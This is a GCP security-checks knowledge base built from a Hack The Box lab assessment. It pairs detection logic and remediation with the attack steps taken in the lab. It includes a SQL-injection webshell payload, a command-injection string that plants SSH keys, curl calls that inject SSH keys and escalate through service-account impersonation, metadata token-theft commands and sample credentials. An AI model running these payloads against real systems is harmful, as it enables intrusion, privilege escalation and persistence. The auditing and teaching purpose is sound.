# GCP Security Checks Knowledge Base

> Source: HTB BlackSky Blizzard Assessment (15 vulnerabilities, full GCP attack chain)

## Check Categories

### 1. Google Cloud Storage (GCS)

#### GCS-001: Public Bucket Access
- **Severity:** CRITICAL
- **Description:** GCS bucket with `allUsers` or `allAuthenticatedUsers` in IAM bindings
- **API Calls:**
  - `storage.buckets.getIamPolicy` — check for public bindings
  - `storage.buckets.list` — enumerate all buckets
- **Detection Logic:**
  ```
  IF bucket_iam_policy contains member "allUsers" OR "allAuthenticatedUsers"
  THEN CRITICAL
  ```
- **Real Attack:** `dev-storage-476345` had public read access, exposing flag files + application source code
- **Remediation:**
  ```bash
  gsutil iam ch -d allUsers gs://BUCKET
  gsutil iam ch -d allAuthenticatedUsers gs://BUCKET
  # Enable uniform bucket-level access
  gsutil uniformbucketlevelaccess set on gs://BUCKET
  ```

#### GCS-002: Service Account Keys in Buckets
- **Severity:** CRITICAL
- **Description:** GCS buckets containing service account private key JSON files
- **API Calls:**
  - `storage.objects.list` — enumerate objects
- **Detection Patterns:** Files matching `*.json` containing `"type": "service_account"` and `"private_key"`
- **Real Attack:** `supportstorage-29342` bucket contained `appengine.json` — full SA private key for `app-engine@` service account
- **Remediation:** Never store SA keys in storage. Use Workload Identity. Rotate and delete unused keys.

#### GCS-003: Sensitive Files in Buckets
- **Severity:** HIGH
- **Description:** SQL dumps, source code, config files stored in accessible buckets
- **Detection Patterns:**
  - `*.sql`, `*.dump` — database backups (may contain cleartext passwords)
  - `*.js`, `*.py`, `*.php`, `*.go`, `*.zip` — application source code
  - `*.env`, `config.*`, `credentials.*` — configuration files
- **Real Attack:**
  - `application-development-29342` contained `web01.sql` with `INSERT INTO` statements with cleartext passwords (`admin:Password123!`, `root:Qb4a3yinZVERnawS`)
  - `appengine-static-content-29342` contained `app-engine.zip` with PHP source code containing hardcoded root password

---

### 2. GCE Metadata Service

#### META-001: Startup Script Secrets
- **Severity:** CRITICAL
- **Description:** GCE instance startup scripts containing hardcoded credentials, API keys, or connection strings
- **API Calls:**
  - `compute.instances.get` → `metadata.items[key=startup-script]`
  - Also check `startup-script-url` for remote scripts
- **Metadata Query:**
  ```bash
  curl -H 'Metadata-Flavor: Google' \
    'http://169.254.169.254/computeMetadata/v1/instance/attributes/startup-script'
  ```
- **Real Attack:** Startup script contained hardcoded FTP credentials (`ftpuser:ftpmegapassword123`) in a curl command. Credentials reused for SSH.
- **Remediation:** Use GCP Secret Manager. Never embed secrets in startup scripts.

#### META-002: Instance with cloud-platform Scope
- **Severity:** CRITICAL
- **Description:** GCE instances using `https://www.googleapis.com/auth/cloud-platform` scope (full GCP access)
- **API Calls:**
  - `compute.instances.get` → `serviceAccounts[].scopes`
- **Detection:**
  ```
  IF scopes contains "https://www.googleapis.com/auth/cloud-platform"
  THEN CRITICAL (overly broad)
  ```
- **Real Attack:** Instance with `cloud-platform` scope allowed metadata token to access GCR, list projects, and enumerate all resources
- **Remediation:** Use least-privilege scopes. Use Workload Identity for GKE.

#### META-003: Metadata Concealment Not Enabled
- **Severity:** HIGH
- **Description:** GKE/K8s nodes without metadata concealment, allowing container-to-metadata attacks
- **Detection:** Check if instances in K8s clusters have metadata concealment or GKE Workload Identity enabled
- **Real Attack:** DaemonSet pod on GCE node queried metadata service to steal SA token

---

### 3. IAM / Service Accounts

#### IAM-001: Service Account Key Audit
- **Severity:** HIGH
- **Description:** Service accounts with user-managed keys (especially old or multiple keys)
- **API Calls:**
  - `iam.serviceAccountKeys.list` for each SA
- **Detection:**
  ```
  IF key.keyType == "USER_MANAGED" THEN flag
  IF key age > 90 days THEN HIGH
  IF SA has multiple active keys THEN MEDIUM
  ```
- **Remediation:** Delete unused keys. Rotate keys < 90 days. Prefer metadata-based tokens or Workload Identity.

#### IAM-002: Delegation Chain Detection (Privilege Escalation)
- **Severity:** CRITICAL
- **Description:** Multi-hop service account impersonation chains enabling privilege escalation
- **Dangerous Permissions:**
  | Permission | Risk |
  |-----------|------|
  | `iam.serviceAccounts.actAs` | Assume SA identity |
  | `iam.serviceAccountKeys.create` | Create persistent key for SA |
  | `iam.serviceAccounts.implicitDelegation` | Multi-hop delegation |
  | `iam.serviceAccounts.getAccessToken` | Generate access token |
  | `iam.serviceAccounts.signBlob` | Sign as SA |
- **API Calls:**
  - `iam.serviceAccounts.testIamPermissions` — test for dangerous perms
  - `getIamPolicy` on each service account
  - Build permission graph across all SAs
- **Detection Logic:**
  ```
  Build directed graph: SA_A → SA_B if A has actAs/getAccessToken/implicitDelegation/keyCreate on B
  Find all paths > 1 hop
  Flag chains reaching high-privilege SAs
  ```
- **Real Attack:**
  ```
  storage-user@ → create key for roleviewer@
  roleviewer@ → implicitDelegation on backup@
  backup@ (delegate) → generateAccessToken for support@
  support@ → access supportstorage-29342 bucket
  ```
  5-hop chain: `storage-user → roleviewer → backup → support → app-engine`
- **REST API for testing:**
  ```bash
  # Test permissions on a SA
  curl -X POST -H "Authorization: Bearer $TOKEN" \
    "https://iam.googleapis.com/v1/projects/PROJECT/serviceAccounts/SA_EMAIL:testIamPermissions" \
    -d '{"permissions": ["iam.serviceAccounts.implicitDelegation", "iam.serviceAccounts.getAccessToken", "iam.serviceAccountKeys.create"]}'
  ```
- **Token generation with delegation:**
  ```bash
  curl -X POST -H "Authorization: Bearer $TOKEN" \
    "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA:generateAccessToken" \
    -d '{
      "delegates": ["projects/-/serviceAccounts/DELEGATE_SA"],
      "scope": ["https://www.googleapis.com/auth/cloud-platform"]
    }'
  ```
- **Remediation:** Audit all impersonation permissions. Use IAM Recommender. Remove unnecessary delegation permissions.

#### IAM-003: Token Creator Role Abuse
- **Severity:** CRITICAL
- **Description:** SAs with `roles/iam.serviceAccountTokenCreator` can generate tokens for target SAs
- **API Calls:**
  - `getIamPolicy` on all SAs → find `roles/iam.serviceAccountTokenCreator` bindings
- **Real Attack:** `tokenmanager@` had Token Creator role → generated token for `editor@` → accessed `editor-space-29342` bucket
- **REST API:**
  ```bash
  curl -X POST -H "Authorization: Bearer $TOKEN" \
    "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA:generateAccessToken" \
    -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}'
  ```
- **Remediation:** Restrict Token Creator to specific target accounts. Use IAM Conditions to limit scope.

#### IAM-004: setMetadata Permission (SSH Key Injection)
- **Severity:** CRITICAL
- **Description:** SAs with `compute.instances.setMetadata` can inject SSH keys into any instance
- **Attack Steps:**
  1. Get instance metadata fingerprint via Compute API
  2. Call `setMetadata` to inject SSH public key as `root` user
  3. GCE guest agent auto-syncs keys → SSH as root
- **API Calls:**
  - `testIamPermissions` with `compute.instances.setMetadata`
  - `compute.instances.get` → get metadata fingerprint
  - `compute.instances.setMetadata` → inject SSH key
- **REST API:**
  ```bash
  # Get fingerprint
  curl -H "Authorization: Bearer $TOKEN" \
    "https://compute.googleapis.com/compute/v1/projects/PROJECT/zones/ZONE/instances/INSTANCE"

  # Inject SSH key
  curl -X POST -H "Authorization: Bearer $TOKEN" \
    "https://compute.googleapis.com/compute/v1/projects/PROJECT/zones/ZONE/instances/INSTANCE/setMetadata" \
    -d '{"fingerprint": "FP", "items": [{"key": "ssh-keys", "value": "root:SSH_PUB_KEY root@attacker"}]}'
  ```
- **Real Attack:** `editor@` SA used `setMetadata` to inject SSH key into `ftp01`, gaining root SSH access
- **Remediation:** Use OS Login instead of metadata SSH keys. Restrict `compute.instances.setMetadata`. Enable OS Login 2FA.

---

### 4. Kubernetes / GKE Security

#### K8S-001: Default SA with Cluster-Admin
- **Severity:** CRITICAL
- **Description:** Default service account in any namespace has `ClusterRoleBinding` to `cluster-admin`
- **API Calls:**
  - `ClusterRoleBindings.list` → find bindings to `cluster-admin`
  - `SelfSubjectRulesReview` → verify permissions
- **Detection:**
  ```
  IF any ClusterRoleBinding:
    subjects contains serviceAccount "default" in any namespace
    AND roleRef = "cluster-admin"
  THEN CRITICAL
  ```
- **Real Attack:** `default` SA in `default` namespace had `cluster-admin` ClusterRoleBinding → `verbs: ["*"], apiGroups: ["*"], resources: ["*"]`
- **REST API:**
  ```bash
  curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
    "https://HOST:16443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
    -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'
  ```
- **Remediation:** Never grant `cluster-admin` to default SAs. Use `automountServiceAccountToken: false`. Apply least-privilege RBAC.

#### K8S-002: Privileged Containers Allowed
- **Severity:** CRITICAL
- **Description:** No Pod Security Standards (PSS) or admission controllers preventing privileged containers
- **Detection:**
  - Check for pods with `securityContext.privileged: true`
  - Check for `hostPath` volume mounts (especially `/`)
  - Check for `hostPID`, `hostNetwork`, `hostIPC`
  - Verify PSS enforcement level on namespaces
- **Real Attack:** With cluster-admin, created DaemonSet with `privileged: true` + `hostPath: "/"` → host filesystem access → read `/host/root/flag.txt` on both nodes
- **Remediation:** Enable PSS (Restricted profile). Use OPA Gatekeeper or Kyverno. Block privileged containers + hostPath mounts.

#### K8S-003: Kubelet API Exposure
- **Severity:** HIGH
- **Description:** Kubelet API (port 10250) allows command execution in containers
- **API Calls:**
  ```bash
  curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
    "https://NODE:10250/run/NAMESPACE/POD/CONTAINER" \
    -d "cmd=COMMAND"
  ```
- **Real Attack:** Kubelet API used to exec into DaemonSet pods and run commands on both nodes
- **Remediation:** Restrict Kubelet API access. Use `--authorization-mode=Webhook`. Disable anonymous auth.

#### K8S-004: SA Token Automount
- **Severity:** MEDIUM
- **Description:** Service accounts with auto-mounted tokens in pods that don't need API access
- **Detection:** Check `serviceaccounts.get` → `automountServiceAccountToken` not explicitly `false`
- **Remediation:** Set `automountServiceAccountToken: false` on SAs and pods that don't need K8s API access.

---

### 5. Google Container Registry (GCR)

#### GCR-001: Unexpected/Hidden Images
- **Severity:** MEDIUM
- **Description:** GCR repositories containing unexpected or hidden images with sensitive data
- **API Calls:**
  ```bash
  # List repos (check both eu.gcr.io and gcr.io)
  curl -u oauth2accesstoken:$TOKEN https://gcr.io/v2/PROJECT/tags/list
  curl -u oauth2accesstoken:$TOKEN https://eu.gcr.io/v2/PROJECT/tags/list
  ```
- **Real Attack:** Hidden `update` image at `gcr.io/mega-multi-1a35fd629228/update` contained flag in layer
- **Remediation:** Audit GCR repos regularly. Use Artifact Analysis for vulnerability scanning. Restrict GCR access.

---

### 6. Application Security

#### APP-001: Command Injection via npm modules
- **Severity:** CRITICAL
- **Description:** Node.js applications using `child_process.exec()` with unsanitized user input
- **Real Attack:** `scp` npm module uses `child_process.exec()`, injected via: `; mkdir -p /home/joe/.ssh; echo 'SSH_KEY' >> /home/joe/.ssh/authorized_keys ;`
- **Remediation:** Use `child_process.execFile()`. Validate all user inputs.

#### APP-002: SQL Injection (SQLite)
- **Severity:** CRITICAL
- **Description:** SQL injection in SQLite-backed applications allowing file write via `writefile()`
- **Real Attack:** `1' UNION SELECT writefile('/var/www/html/pwn.php','<?php system($_GET[c]);?>')--` → PHP webshell
- **Remediation:** Use parameterized queries. Disable `writefile()` function.

#### APP-003: Hardcoded Credentials in Source
- **Severity:** HIGH
- **Description:** Application source code containing hardcoded passwords in login arrays
- **Real Attack:** PHP source had `$logins = array('root' => 'akuCvCwWKmRJZfaa')`
- **Remediation:** Use Secret Manager or environment variables.

---

### 7. Cross-Cutting Patterns

#### PATTERN-001: Container-to-Cloud Escape
Container compromise → host filesystem → GCE metadata → SA token → cloud resources
- **Attack Path:** Pod → privileged DaemonSet → hostPath mount → metadata query → SA token with `cloud-platform` scope → GCR/GCS/IAM access

#### PATTERN-002: IAM Delegation Graph
Build a complete graph of all SA relationships:
- `actAs` edges
- `getAccessToken` edges
- `implicitDelegation` edges
- `keyCreate` edges
Find all paths from low-privilege SAs to high-privilege SAs.

#### PATTERN-003: Credential Reuse
Same credentials (especially FTP/SSH) reused across services
- **Real Attack:** FTP password from startup script reused for SSH access

---

## GCP CLI Commands Reference

```bash
# Authentication
gcloud auth list
gcloud config set account SA_EMAIL
gcloud auth activate-service-account --key-file=KEY.json
gcloud auth print-access-token

# IAM
gcloud iam service-accounts list
gcloud iam service-accounts keys list --iam-account=SA_EMAIL
gcloud iam service-accounts keys create KEY.json --iam-account=SA_EMAIL

# GCS
gsutil ls
gsutil ls gs://BUCKET/
gsutil iam get gs://BUCKET
gsutil cp gs://BUCKET/OBJECT ./

# Compute
gcloud compute instances list
gcloud compute instances describe INSTANCE --zone=ZONE

# GCR
gcloud container images list --repository=gcr.io/PROJECT

# Kubernetes
kubectl auth can-i --list
kubectl get clusterrolebindings
kubectl get pods --all-namespaces

# Metadata Service
curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/attributes/startup-script'
curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email'
curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'
curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes'
```
